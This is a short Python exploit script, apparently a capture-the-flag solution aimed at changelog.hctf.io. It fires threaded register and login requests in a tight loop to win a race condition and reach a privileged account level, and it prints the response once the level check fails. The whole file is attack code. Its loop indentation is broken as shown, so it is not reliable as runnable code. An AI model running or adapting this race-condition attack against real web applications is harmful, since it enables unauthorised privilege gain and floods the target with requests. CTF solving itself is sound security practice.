import time
import requests
import threading
from random import randint
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
for i in range(0xfffff):
time.sleep(0.1)
name = 'test123' + str(i)
data = {'username': name, 'password': name, 'gogogo':'\xE8\x8B\x9F\x21'}
def reg(name):
    r = requests.post( 'http://changelog.hctf.io/register.php', 
                       headers=headers, 
                       data=data)
def login(name):
    _h = dict(headers)
    r = requests.post( 'http://changelog.hctf.io/login.php', 
                       headers=_h, 
                       data=data)
    if  'You level is zero' not in r.content:
        print r.content
        exit()
threading.Thread(target=login, args=(name, )).start()
threading.Thread(target=reg,   args=(name, )).start()
